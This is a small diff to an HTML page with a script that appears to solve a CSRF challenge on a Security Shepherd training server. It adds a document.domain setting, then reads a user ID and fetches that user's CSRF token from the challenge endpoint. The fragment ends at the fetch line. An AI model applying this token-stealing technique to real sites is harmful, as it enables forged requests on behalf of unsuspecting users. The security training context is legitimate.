@@ -1,6 +1,7 @@
 <html>
     <body>
         <script>
+            document.domain="security-shepherd.dev.inf.elasticnet.co";
             var userId = $(contentDiv).children('ul')[0].children[0].children[0].text;
             const regex = /Your csrf Token for this Challenge is: (.+) <br\/>/;
             const csrf=fetch('https://security-shepherd.dev.inf.elasticnet.co/user/csrfchallengeseven/getToken?userId='+ userId)
